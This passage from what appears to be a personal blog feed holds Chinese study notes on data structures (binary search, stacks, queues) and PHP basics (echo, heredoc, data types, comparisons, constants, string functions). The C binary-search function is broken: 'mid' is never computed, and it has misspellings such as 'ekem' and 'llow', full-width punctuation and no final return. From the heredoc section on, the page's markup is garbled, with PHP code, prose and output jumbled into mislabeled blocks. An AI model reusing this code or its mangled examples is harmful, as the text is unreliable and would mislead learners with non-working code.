class="line"></span><br></pre></td></tr></table></figure><h5 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">int binsearch(SeqList slist,int key,int *pos)</span><br><span class="line">&#123;</span><br><span class="line">    int index=1;int mid;</span><br><span class="line">    int low = 0;int high=slist-&gt;n-1;</span><br><span class="line">    while(low&lt;=high)</span><br><span class="line">    &#123;</span><br><span class="line">        if(slist-&gt;ekem[mid]==key)</span><br><span class="line">        &#123;</span><br><span class="line">            *pos=mid;</span><br><span class="line">            printf(&quot;已经找到，共进行%d次比较\n&quot;，index);</span><br><span class="line">            printf(&quot;要找到的数据%d在位置%d上\n&quot;，key,mid);</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">        else if (slist-&gt;elem[mid]&gt;key)</span><br><span class="line">        &#123;</span><br><span class="line">            high = mid -1;</span><br><span class="line">        &#125;</span><br><span class="line">        else low = mid + 1;</span><br><span class="line">        index++;</span><br><span class="line">    &#125;</span><br><span class="line">    *pos = llow;</span><br><span class="line">    printf(&quot;没找到，共进行%d次比较\n&quot;，index-1)；</span><br><span class="line">    printf(&quot;可以在%d上插入位置\n&quot;，*pos);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><h4 id="特性："><a href="#特性：" class="headerlink" title="特性："></a>特性：</h4><p>​    后进先出</p><h4 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h4><p>​    顺序栈</p><p>​    链栈</p><h4 id="应用："><a href="#应用：" class="headerlink" title="应用："></a>应用：</h4><p>前缀中缀表达式</p><p><a href="https://www.yuque.com/vernus-u2vmo/tgvyrt/zh4geied5wd2ldpm?singleDoc#">https://www.yuque.com/vernus-u2vmo/tgvyrt/zh4geied5wd2ldpm?singleDoc#</a> 《栈的应用》</p><p>计算器</p><p>单调栈（例题——洛谷《音乐会的等待》）</p><h3 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h3><h4 id="特性：-1"><a href="#特性：-1" class="headerlink" title="特性："></a>特性：</h4><p>先进先出，跟栈相反</p><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><h5 id="单队列"><a href="#单队列" class="headerlink" title="单队列"></a>单队列</h5><p>假溢出</p><h5 id="循环队列"><a href="#循环队列" class="headerlink" title="循环队列"></a>循环队列</h5><p>需要一个闲置的空区</p><p>可以解决顺序队列中的假溢出和越界问题</p>]]></content>
      
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP学习</title>
      <link href="/2023/07/01/PHP%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/07/01/PHP%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="php学习"><a href="#php学习" class="headerlink" title="php学习"></a><strong>php学习</strong></h1><h2 id="echo函数"><a href="#echo函数" class="headerlink" title="echo函数"></a><strong>echo函数</strong></h2><p><strong>echo是一个语言结构，使用的时候可以不用加括号，也可以加上括号、</strong></p><h5 id="用法"><a href="#用法" class="headerlink" title="用法"></a><strong>用法</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo&quot;&quot;</span><br><span class="line">echo(&quot;&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;这是一个PHP！&lt;h2&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;我要学php&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP很好玩&lt;br&gt;&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>标准输出</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这是一个PHP！</span><br><span class="line">我要学php</span><br><span class="line">PHP很好玩</span><br></pre></td></tr></table></figure><p><strong>在上面的语言中</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;br&gt;换行</span><br><span class="line">&lt;h2&gt;二级标题</span><br></pre></td></tr></table></figure><p><strong>当然也可以不用这样</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$txt1=&quot;学习 PHP&quot;;</span><br><span class="line">$txt2=&quot;RUNOOB.COM&quot;;</span><br><span class="line">$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);</span><br><span class="line"></span><br><span class="line">echo $txt1;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;在 $txt2 学习 PHP &quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;我车的品牌是 &#123;$cars[0]&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>标准输出</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">学习 PHP</span><br><span class="line">在 RUNOOB.COM 学习 PHP </span><br><span class="line">我车的品牌是 Volvo</span><br></pre></td></tr></table></figure><p><strong>array[]是数组函数</strong></p><p><strong><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array">Array - JavaScript | MDN (mozilla.org)</a></strong></p><h2 id="print函数"><a href="#print函数" class="headerlink" title="print函数"></a><strong>print函数</strong></h2><p><strong>print同样是一个语言结构，可以使用括号，也可以不使用</strong></p><p><strong>用法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print&quot;&quot;</span><br><span class="line">print(&quot;&quot;)</span><br></pre></td></tr></table></figure><p><strong>具体用法和echo一样，就不过多叙述</strong></p><h2 id="PHP-EOF（heredoc"><a href="#PHP-EOF（heredoc" class="headerlink" title="PHP-EOF（heredoc"></a><strong>PHP-EOF（<a href="http://www.baidu.com/link?url=2Z7us7hFWorCxCSjhpGbWyu4bidI37Qp0Q5CrhXk6rLlnwKsO72h3GE1TjfCxsE0"><em>heredoc</em></a></strong></h2><p><strong>PHP-EOF是一种定界符</strong></p><p><strong>是一种在命令行shell（如sh、csh、ksh、bash、PowerShell和zsh）和程序语言（像Perl、PHP、Python和Ruby）里定义一个字符串的方法。</strong></p><h4 id="条件："><a href="#条件：" class="headerlink" title="条件："></a><strong>条件：</strong></h4><ul><li><p><strong>必须后面衔接分号，否则编译不通过</strong></p></li><li><p><strong>EOF可以用其他的字符代替，只需要保证结束表示和开始表示一致即可</strong></p></li><li><p><strong>结束标识必须独自占一行（即必须从行首开始，前后不能衔接多余空白*且前后不能空格</strong></p></li><li><p><strong>开始标识可以不带引号或带单双引号，不带引号与带双引号效果一致，解释内嵌的变量和转义符号，带单引号则不解释内嵌的变量和转义符号。</strong></p></li><li><p><strong>内容需要内嵌引号（单引号或双引号）时，不需要加转义符，本身对单双引号转义，此处相当与q和qq的用法。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &lt;&lt;&lt;EOF</span><br><span class="line">&lt;p&gt;哈哈&lt;/p&gt;</span><br><span class="line">&lt;p&gt;你猜&lt;/p&gt;</span><br><span class="line">哈哈哈&lt;br&gt;</span><br><span class="line">你猜我让你猜什么&lt;br&gt;</span><br><span class="line">EOF</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>在这里的时候</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;br&gt;是换行的</span><br><span class="line">&lt;p&gt;是便是一段的</span><br></pre></td></tr></table></figure><p><strong><img src="https://s2.loli.net/2023/07/01/LPev5w7u8BhXzga.png" alt="202371144329.png"></strong></p></li></ul><h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a><strong>注意：</strong></h4><ul><li><p><strong>以&lt;&lt;&lt;EOF为开始标记开始，以EOF结束标记结束，结束标语必须顶头写，不能有任何的缩进和空格，且在结束标记末尾要有分号</strong></p></li><li><p><strong>开始标记和结束标记相同，不局限于EOF,EOO,EOD,EOT什么的也可以，只要保证结束标记和开始标记不出现在正文中皆可以了</strong></p></li><li><p><strong>于开始标记和结束标记之间的变量可以被正常解析，但是函数则不可以。在 heredoc 中，变量不需要用连接符 . 或 , 来拼接</strong></p></li><li><p><strong>后面的好像解析的时候自己解析乱了了，如果想继续看的话可以转（算是光明正得的水一波自己的笔记</strong></p></li><li><p><strong><a href="https://note.youdao.com/s/74MKWr93">https://note.youdao.com/s/74MKWr93</a></strong></p></li><li><p>```</p><?php$a="歪比";$name= <<<EOF    "abc"$a    "123"<br>EOF;echo $name;?><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  **![202371144653.png](https://s2.loli.net/2023/07/01/IyLY5JsgKfHeDZE.png)**</span><br><span class="line"></span><br><span class="line">## **PHP数据类型**</span><br><span class="line"></span><br><span class="line">**PHP变量存储不同的数据类型，支持**</span><br><span class="line"></span><br><span class="line">- **String（字符串）**</span><br><span class="line">- **Integer（整型）**</span><br><span class="line">- **Float（浮点型）**</span><br><span class="line">- **Boolean（布尔型）**</span><br><span class="line">- **Array（数组）**</span><br><span class="line">- **Object（对象）**</span><br><span class="line">- **NULL（空值）**</span><br><span class="line">- **Resource（资源类型）**</span><br><span class="line"></span><br><span class="line">#### **PHP字符串**</span><br><span class="line"></span><br><span class="line">**一个字符串就是一串字符的序列**</span><br><span class="line"></span><br></pre></td></tr></table></figure><?php $x = "Helloworld!";echo $x;echo "<br>"; $x = 'Helloworld!';echo $x;?><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**标准输出**</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Helloworld!<br>Helloworld!</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### **PHP整型**</span><br><span class="line"></span><br><span class="line">**没有小数点的整数**</span><br><span class="line"></span><br><span class="line">- **整数必须至少有一个数字 (0-9)**</span><br><span class="line">- **整数不能包含逗号或空格**</span><br><span class="line">- **整数是没有小数点的**</span><br><span class="line">- **整数可以是正数或负数**</span><br><span class="line">- **整型可以用三种格式来指定：十进制， 十六进制（ 以 0x 为前缀）或八进制（前缀为 0）。**</span><br><span class="line"></span><br></pre></td></tr></table></figure><?php $x = 5985;var_dump($x);echo "<br>"; $x = -345; // 负数 var_dump($x);echo "<br>"; $x = 0x8C; // 十六进制数var_dump($x);echo "<br>";$x = 047; // 八进制数var_dump($x);?><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**var_dump（）函数打印输入的字符和其数据类型，**</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>int(5985)<br>int(-345)<br>int(140)<br>int(39)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**上面四种都是int所以都输出int**</span><br><span class="line"></span><br></pre></td></tr></table></figure><?php$b = 3.1;$c = true;var_dump($b, $c);?><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>float(3.1) bool(true)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### **PHP 浮点型**</span><br><span class="line"></span><br><span class="line">**浮点数是带小数部分的数字，或是指数形式。**</span><br><span class="line"></span><br><span class="line">**具体来说和上面的整型差不多**</span><br><span class="line"></span><br><span class="line">#### **PHP布尔型**</span><br><span class="line"></span><br><span class="line">**布尔型就是TRUE和FALSE**</span><br><span class="line"></span><br><span class="line">**布尔型常用语条件判断**</span><br><span class="line"></span><br><span class="line">#### **PHP数组**</span><br><span class="line"></span><br><span class="line">**数组可以在一个变量中存储多个值**</span><br><span class="line"></span><br></pre></td></tr></table></figure><?php $cars=array("Volvo","BMW","Toyota");var_dump($cars);?><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>array(3) { [0]=&gt; string(5) “Volvo” [1]=&gt; string(3) “BMW” [2]=&gt; string(6) “Toyota” }</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**这里的话应该是array数组类型，里面存有三个值，**</span><br><span class="line"></span><br><span class="line">**【0】位置也就是正常的第一个里面是一个有五个字符的字符串volvo，**</span><br><span class="line"></span><br><span class="line">**以此类推**</span><br><span class="line"></span><br><span class="line">#### **PHP对象**</span><br><span class="line"></span><br><span class="line">**对象数据类型也可以用于存储数据**</span><br><span class="line"></span><br><span class="line">**在PHP中，对象必须声明**</span><br><span class="line"></span><br><span class="line">**首先你要用class函数声明类对象。类是可以包含属性和方法的结构。**</span><br><span class="line"></span><br><span class="line">**然后定义数据类型并在实例化的类中使用数据类型。**</span><br><span class="line"></span><br></pre></td></tr></table></figure><?phpclass Car{    var $color;    function __construct($color="green") {      $this->color = $color;    }    function what_color() {      return $this->color;    }}function print_vars($obj) {   foreach (get_object_vars($obj) as $prop => $val) {     echo "\t$prop = $val\n";   }}// 实例一个对象$herbie = new Car("white");// 显示 herbie 属性echo "\therbie: Properties\n";print_vars($herbie);?></body></html><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>class：定义一个类。Car：类名为 Car。var：定义一个变量。$color：一个名为 $color 的变量。__construct：构造函数，用于创建类的实例时自动执行的方法。function：定义一个函数。what_color：函数名为 what_color。return：函数返回值的关键字。$this：指向当前对象的引用。print_vars：函数名为 print_vars。$obj：一个名为 $obj 的变量。foreach：循环结构用于遍历数组或对象的每个元素。get_object_vars：返回对象的属性和值的关联数组。$prop：一个在循环过程中用来存储属性名的变量。$val：一个在循环过程中用来存储属性值的变量。echo：输出函数用于打印文本。new：创建一个新的对象实例。Car("white")：用 Car 类创建一个新的对象，并将颜色参数设置为 “white”。herbie：变量名为 herbie。Properties：文本字符串 " Properties"。print_vars($herbie)：调用 print_vars 函数，并将 herbie 传递给它作为参数。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**测试结果**</span><br><span class="line"></span><br></pre></td></tr></table></figure>herbie: Properties color = white<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### **PHP-NULL值**</span><br><span class="line"></span><br><span class="line">**NULL表示变量没有值。NULL是数据类型为NULL的值。**</span><br><span class="line"></span><br><span class="line">**NULL值表示一个变量是否为空值。同样可以用于数值空值和NULL值的区别。**</span><br><span class="line"></span><br><span class="line">**可以通过设置变量值为NULL来清空变量数据。**</span><br><span class="line"></span><br></pre></td></tr></table></figure><?php$x="Hello world!";$x=null;var_dump($x);?><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**测试结果**</span><br><span class="line"></span><br></pre></td></tr></table></figure>NULL<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### **PHP资源类型**</span><br><span class="line"></span><br><span class="line">**PHP 资源 resource 是一种特殊变量，保存了到外部资源的一个引用。**</span><br><span class="line"></span><br><span class="line">**常见资源数据类型有打开文件、数据库连接、图形画布区域等。**</span><br><span class="line"></span><br><span class="line">**由于资源类型变量保存有为打开文件、数据库连接、图形画布区域等的特殊句柄，因此将其它类型的值转换为资源没有意义。**</span><br><span class="line"></span><br><span class="line">**使用 get_resource_type() 函数可以返回资源（resource）类型：**</span><br><span class="line"></span><br><span class="line">**get_resource_type(resource $handle): string**</span><br><span class="line">**此函数返回一个字符串，用于表示传递给它的 resource 的类型。如果参数不是合法的 resource，将产生错误。**</span><br><span class="line"></span><br><span class="line">**简单来说,php资源类型变量就是用来打开文件、数据库连接、图形化部区域等的一种特殊变量。**</span><br><span class="line"></span><br><span class="line">## **PHP类型比较**</span><br><span class="line"></span><br><span class="line">**PHP是弱类型语言，但是也要进行比较**</span><br><span class="line"></span><br><span class="line">**松散比较：==的比较，只比较值不比较类型**</span><br><span class="line"></span><br><span class="line">**严格比较：===的比较，比较值和类型**</span><br><span class="line"></span><br></pre></td></tr></table></figure><?phpif(66=="66"){    echo "1.值相等";}echo PHP_EOL;<p>if(66===”66”){<br>    echo “2.类型相等”;<br>}else{<br>    echo”3.类型不相等”;<br>}<br>?&gt;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**这里面的PHP_EOL是换行符，后面应该会写的**</span><br><span class="line"></span><br><span class="line">**测试结果**</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>1.值相等 3.类型不相等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**PHP中比较0、false、null**</span><br><span class="line"></span><br></pre></td></tr></table></figure><?phpecho '0 == false: ';var_dump(0 == false);echo '0 === false: ';var_dump(0 === false);echo PHP_EOL;echo '0 == null: ';var_dump(0 == null);echo '0 === null: ';var_dump(0 === null);echo PHP_EOL;echo 'false == null: ';var_dump(false == null);echo 'false === null: ';var_dump(false === null);echo PHP_EOL;echo '"0" == false: ';var_dump("0" == false);echo '"0" === false: ';var_dump("0" === false);echo PHP_EOL;echo '"0" == null: ';var_dump("0" == null);echo '"0" === null: ';var_dump("0" === null);echo PHP_EOL;echo '"" == false: ';var_dump("" == false);echo '"" === false: ';var_dump("" === false);echo PHP_EOL;echo '"" == null: ';var_dump("" == null);echo '"" === null: ';var_dump("" === null);<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**测试输出**</span><br><span class="line"></span><br></pre></td></tr></table></figure>0 == false: bool(true)0 === false: bool(false)0 == null: bool(true)0 === null: bool(false)false == null: bool(true)false === null: bool(false)"0" == false: bool(true)"0" === false: bool(false)"0" == null: bool(false)"0" === null: bool(false)"" == false: bool(true)"" === false: bool(false)"" == null: bool(true)"" === null: bool(false)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**PHP中比较图**</span><br><span class="line"></span><br><span class="line">**https://www.runoob.com/wp-content/uploads/2019/05/xxxxphp.png**</span><br><span class="line"></span><br><span class="line">## **PHP常量**</span><br><span class="line"></span><br><span class="line">**常量是一个简单值的标识符，该数值在脚本中不能改变**</span><br><span class="line"></span><br><span class="line">**一个常来那个使用英文字幕，下划线和数字组成，但数字不能作为首字母出现。（常量名不需要加 $ 修饰符)。**</span><br><span class="line"></span><br><span class="line">**常量在整个脚本中都可以使用。**</span><br><span class="line"></span><br><span class="line">**语法**</span><br><span class="line"></span><br></pre></td></tr></table></figure>bool define ( string $name , mixed $value [, bool $case_insensitive = false ] )<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- **name：必选参数，常量名称，即标志符。**</span><br><span class="line"></span><br><span class="line">- **value：必选参数，常量的值。**</span><br><span class="line"></span><br><span class="line">- **case_insensitive ：可选参数，如果设置为 TRUE，该常量则大小写不敏感，默认是大小写敏感的。**</span><br><span class="line"></span><br><span class="line">  **注意：自 PHP 7.3.0 开始，定义不区分大小写的常量已被弃用。从 PHP 8.0.0 开始，只有 false 是可接受的值，传递 true 将产生一个警告。**</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><?phpdefine("aha","有意思捏");echo aha;echo '<br>';echo greeting；?><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**这里的话定义了一个常量aha=有意思捏**</span><br><span class="line"></span><br><span class="line">**greeting没有被定义应该会给出警告但还是会出现**</span><br><span class="line"></span><br><span class="line">**测试结果**</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>有意思捏</p><p>Warning: Use of undefined constant greeting； - assumed ‘greeting；’ (this will throw an Error in a future version of PHP) in D:\Ctf\phpStudy_64\phpstudy_pro\WWW\php\测试.php on line 5<br>greeting；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### **常量一经定义就是全局的**</span><br><span class="line"></span><br></pre></td></tr></table></figure><?phpdefine("GREETING", "欢迎访问 Runoob.com"); function myTest() {    echo GREETING;} myTest();    // 输出 "欢迎访问 Runoob.com"?><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>欢迎访问 Runoob.com</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## **PHP字符串变量**</span><br><span class="line"></span><br><span class="line">**字符串变量用来包含有字符串的值**</span><br><span class="line"></span><br><span class="line">**在创建字符串之后，我们就可以对其进行操作，直接使用或者存储起来。**</span><br><span class="line"></span><br></pre></td></tr></table></figure><?php $txt="Hello World";echo $txt;?><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**测试输出:**</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Hello World</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### **PHP并置运算符**</span><br><span class="line"></span><br><span class="line">**并置运算符.将两个字符串值连接起来**</span><br><span class="line"></span><br></pre></td></tr></table></figure><?php $txt1="Hello World";$txt2="hello 个锤子";echo $txt1 . " " . $txt2;?><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**测试输出**</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Hello World hello 个锤子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### **PHP strlen()函数**</span><br><span class="line"></span><br><span class="line">**strlen函数返回字符串的长度（字节数）**</span><br><span class="line"></span><br></pre></td></tr></table></figure><?php $txt1="Hello World<br>";$txt2="hello 个锤子<br>";echo $txt1 . " " . $txt2;echo strlen($txt1);?><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**测试输出**</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Hello World<br>hello 个锤子<br>15</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### **PHP strpos函数**</span><br><span class="line"></span><br><span class="line">**strpos函数用于在字符串中查找一段指定的文本或者一个字符**</span><br><span class="line"></span><br><span class="line">**如果找到了就会返回第一个匹配的字符位置。如果没找到就会返回FALSE**</span><br><span class="line"></span><br></pre></td></tr></table></figure><?php $txt1="Hello World<br>";$txt2="hello 个锤子<br>";echo strpos($txt1,$txt2);?><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**测试结果**</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 